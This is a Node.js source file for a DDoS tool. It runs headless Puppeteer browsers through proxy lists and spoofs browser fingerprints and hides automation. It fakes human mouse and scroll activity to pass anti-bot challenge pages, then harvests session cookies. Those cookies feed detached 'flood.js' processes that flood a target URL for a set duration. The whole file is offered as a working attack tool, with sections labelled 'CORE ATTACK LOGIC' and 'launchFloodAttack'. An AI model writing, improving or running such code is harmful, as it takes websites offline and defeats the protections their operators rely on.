// core imports
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const asyncLib = require("async");
const { spawn } = require("child_process");
const { exec } = require("child_process");
const chalk = require('chalk');

// ========== KONFIGURASI & VALIDASI ==========
const CONFIG = {
    MAX_RETRIES: 3,
    NAVIGATION_TIMEOUT: 60000,
    REQUEST_DELAY: { MIN: 2000, MAX: 5000 },
    MOUSE_MOVEMENT: { MIN_MOVES: 6, MAX_MOVES: 15, MIN_DELAY: 30, MAX_DELAY: 120 }
};

// Validasi input dengan error handling yang lebih baik
function validateInput() {
    if (process.argv.length < 8) {
        console.log(`
${chalk.cyanBright('BROWSER V3 OPTIMIZED')} | Updated: May 20, 2025
Usage: node ${process.argv[1]} <target> <duration> <browser_threads> <flood_threads> <rates> <proxy_file>
Example: node ${process.argv[1]} https://example.com 400 5 2 30 proxies.txt
        `);
        process.exit(1);
    }

    const targetURL = process.argv[2];
    if (!/^https?:\/\//i.test(targetURL)) {
        throw new Error('URL must start with http:// or https://');
    }

    return {
        targetURL,
        duration: parseInt(process.argv[3], 10),
        browserThreads: parseInt(process.argv[4], 10),
        floodThreads: parseInt(process.argv[5], 10),
        rates: process.argv[6],
        proxyFile: process.argv[7]
    };
}

// ========== UTILITY FUNCTIONS ==========
class Utility {
    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    static randomString(minLength, maxLength) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = this.randomInt(minLength, maxLength);
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars[this.randomInt(0, chars.length - 1)];
        }
        return result;
    }

    static randomElement(array) {
        return array[this.randomInt(0, array.length - 1)];
    }
}

// ========== RESOURCE MANAGEMENT ==========
class ResourceManager {
    static userAgents = [
        `BROWSER-V3.0/${Utility.randomInt(122, 135)} (Google.com)`,
        `CheckHost/${Utility.randomInt(122, 135)}`
    ];

    static readProxies(filePath) {
        try {
            const data = fs.readFileSync(filePath, 'utf8');
            return data.split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0);
        } catch (error) {
            console.error(`[ERROR] Failed to read proxy file: ${error.message}`);
            return [];
        }
    }

    static getRandomUserAgent() {
        return this.randomElement(this.userAgents);
    }
}

// ========== BROWSER MANAGEMENT ==========
class BrowserManager {
    static async createBrowserInstance(proxy, userAgent) {
        const browserArgs = [
            `--proxy-server=${proxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            '--disable-gpu',
            '--ignore-certificate-errors',
            '--disable-features=site-per-process'
        ];

        try {
            return await puppeteer.launch({
                headless: true,
                args: browserArgs,
                defaultViewport: { width: 360, height: 640, isMobile: true },
                ignoreHTTPSErrors: true
            });
        } catch (error) {
            throw new Error(`Browser launch failed: ${error.message}`);
        }
    }

    static async spoofFingerprint(page, userAgent) {
        await page.evaluateOnNewDocument((ua) => {
            try {
                Object.defineProperty(navigator, 'userAgent', { value: ua });
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                Object.defineProperty(navigator, 'language', { value: 'en-US' });
                Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
            } catch (e) {
                // Silent fail
            }
        }, userAgent);
    }
}

// ========== HUMAN SIMULATION (OPTIMIZED) ==========
class HumanSimulator {
    static async simulateNaturalBehavior(page) {
        try {
            // Scroll simulation
            await page.evaluate(() => {
                window.scrollBy(0, Math.random() * 300 + 100);
            });
            
            await Utility.sleep(Utility.randomInt(800, 2000));
            
            // Random mouse moves
            await page.mouse.move(
                Utility.randomInt(50, 300),
                Utility.randomInt(50, 500),
                { steps: Utility.randomInt(3, 8) }
            );
            
            await Utility.sleep(Utility.randomInt(500, 1500));
        } catch (error) {
            // Ignore simulation errors
        }
    }

    static async solveChallenge(page, proxy) {
        try {
            const content = await page.content();
            if (content.includes("challenge-platform") || content.includes("Attention Required")) {
                console.log(`[CHALLENGE] Detected on proxy ${proxy}`);
                
                // Click at random position
                await page.mouse.click(
                    Utility.randomInt(100, 200),
                    Utility.randomInt(100, 200)
                );
                
                await Utility.sleep(3000);
                return true;
            }
        } catch (error) {
            console.error(`[ERROR] Challenge solving failed: ${error.message}`);
        }
        return false;
    }
}

// ========== CORE ATTACK LOGIC ==========
class AttackOrchestrator {
    constructor(config) {
        this.config = config;
        this.cookieCount = 0;
        this.proxies = ResourceManager.readProxies(config.proxyFile);
        this.queue = asyncLib.queue(this.processProxy.bind(this), config.browserThreads);
    }

    async processProxy(task, callback) {
        try {
            const result = await this.attemptBrowserAttack(task.browserProxy);
            callback(null, { task, ...result });
        } catch (error) {
            callback(null, { task, error: error.message });
        }
    }

    async attemptBrowserAttack(proxy, retryCount = 0) {
        let browser = null;
        try {
            const userAgent = ResourceManager.getRandomUserAgent();
            browser = await BrowserManager.createBrowserInstance(proxy, userAgent);
            const [page] = await browser.pages();

            // Configure page
            await BrowserManager.spoofFingerprint(page, userAgent);
            page.setDefaultNavigationTimeout(CONFIG.NAVIGATION_TIMEOUT);
            page.setDefaultTimeout(CONFIG.NAVIGATION_TIMEOUT);

            // Navigate and simulate
            await page.goto(this.config.targetURL, { 
                waitUntil: 'domcontentloaded',
                timeout: CONFIG.NAVIGATION_TIMEOUT 
            });

            await HumanSimulator.simulateNaturalBehavior(page);
            
            // Attempt challenge solving
            await HumanSimulator.solveChallenge(page, proxy);

            // Collect cookies with retry logic
            const cookies = await this.collectValidCookies(page, proxy);
            
            if (cookies && cookies.length > 0) {
                return await this.handleSuccess(proxy, page, cookies, userAgent);
            }

            throw new Error('No valid cookies obtained');

        } catch (error) {
            if (browser) await browser.close().catch(() => {});
            
            if (retryCount < CONFIG.MAX_RETRIES) {
                console.log(`[RETRY] ${proxy} - Attempt ${retryCount + 1}`);
                await Utility.sleep(Utility.randomInt(1000, 3000));
                return this.attemptBrowserAttack(proxy, retryCount + 1);
            }
            
            throw error;
        }
    }

    async collectValidCookies(page, proxy, maxAttempts = 3) {
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            const cookies = await page.cookies();
            const validCookies = cookies.filter(c => c.value && c.value.length >= 5);
            
            if (validCookies.length > 0) {
                return validCookies;
            }
            
            if (attempt < maxAttempts) {
                await Utility.sleep(Utility.randomInt(2000, 4000));
                await HumanSimulator.simulateNaturalBehavior(page);
            }
        }
        return null;
    }

    async handleSuccess(proxy, page, cookies, userAgent) {
        const title = await page.title().catch(() => 'NO_TITLE');
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        this.cookieCount++;
        console.log(chalk.green(
            `[SUCCESS] Total: ${this.cookieCount} | Title: ${title.substring(0, 30)} | Proxy: ${proxy}`
        ));

        // Launch flood attack
        this.launchFloodAttack(cookieString, userAgent, proxy);
        
        await browser.close().catch(() => {});
        
        return { success: true, cookies: cookieString };
    }

    launchFloodAttack(cookies, userAgent, proxy) {
        const child = spawn("node", [
            "flood.js",
            this.config.targetURL,
            this.config.duration.toString(),
            this.config.floodThreads.toString(),
            proxy,
            this.config.rates,
            cookies,
            userAgent
        ], { 
            stdio: 'ignore', 
            detached: true 
        });

        child.on('error', (error) => {
            console.error(`[FLOOD ERROR] ${error.message}`);
        });
        child.unref();
    }

    start() {
        if (this.proxies.length === 0) {
            throw new Error('No proxies available');
        }

        console.log(chalk.cyan(`[START] Processing ${this.proxies.length} proxies`));
        
        this.proxies.forEach(proxy => {
            this.queue.push({ browserProxy: proxy });
        });

        // Setup cleanup timer
        setTimeout(() => this.cleanup(), this.config.duration * 1000);
    }

    cleanup() {
        console.log(chalk.yellow('[CLEANUP] Shutting down attack'));
        this.queue.kill();
        
        // Cleanup processes
        exec('pkill -f "node.*flood"', () => {});
        setTimeout(() => process.exit(0), 3000);
    }
}

// ========== MAIN EXECUTION ==========
async function main() {
    try {
        // Setup error handling
        process.on('uncaughtException', (error) => {
            console.error('[FATAL ERROR]', error.message);
        });

        process.on('unhandledRejection', (reason) => {
            console.error('[UNHANDLED REJECTION]', reason);
        });

        // Initialize stealth plugin
        puppeteer.use(puppeteerStealth());

        // Validate and start
        const config = validateInput();
        
        console.clear();
        console.log(chalk.green("[OPTIMIZED BROWSER ATTACK]"));
        console.log(chalk.green(`Target: ${config.targetURL}`));
        console.log(chalk.green(`Duration: ${config.duration}s | Browser Threads: ${config.browserThreads}`));
        console.log(chalk.green(`Flood Threads: ${config.floodThreads} | Rates: ${config.rates}`));

        const orchestrator = new AttackOrchestrator(config);
        orchestrator.start();

    } catch (error) {
        console.error(chalk.red(`[STARTUP FAILED] ${error.message}`));
        process.exit(1);
    }
}

// Start application
if (require.main === module) {
    main();
}

module.exports = { AttackOrchestrator, Utility, BrowserManager };